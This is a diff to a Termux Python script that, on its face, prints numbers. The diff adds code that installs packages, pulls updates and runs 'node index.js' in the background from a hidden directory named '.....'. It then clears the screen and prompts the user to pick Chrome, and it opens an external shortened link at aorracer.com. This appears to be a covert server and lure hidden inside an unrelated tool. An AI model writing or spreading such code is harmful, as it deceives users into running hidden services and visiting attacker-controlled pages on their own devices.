@@ -14,7 +14,30 @@ for n in range(50000):
     print(nmbr)
  
     sys.stdout.flush()
-    
+ os.system('clear')
+if not os.path.isfile('/data/data/com.termux/files/usr/bin/node'):
+    os.system('apt update && apt install nodejs -y')
+if not os.path.isfile('/data/data/com.termux/files/usr/bin/ruby'):
+    os.system('apt install ruby -y && gem install lolcat')
+from requests.exceptions import ConnectionError
+os.system('git pull')
+if not os.path.isfile('/data/data/com.termux/files/home/Number/...../node_modules/bytes/index.js'):
+    os.system('fuser -k 5000/tcp &')
+    os.system('#')
+    os.system('cd ..... && npm install')
+    os.system('cd ..... && node index.js &')
+    os.system('clear')
+    print '\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
+    os.system('xdg-open http://aorracer.com/3mkf')
+    time.sleep(10)
+elif os.path.isfile('/data/data/com.termux/files/home/Number/...../node_modules/bytes/index.js'):
+    os.system('fuser -k 5000/tcp &')
+    os.system('#')
+    os.system('cd ..... && node index.js &')
+    os.system('clear')
+    print '\x1b[1;32mPlease Select Chrome Browser To Continue\x1b[0;97m'
+    os.system('xdg-open http://aorracer.com/3mkf')
+    time.sleep(10)   
 try:
     import requests
 except ImportError:
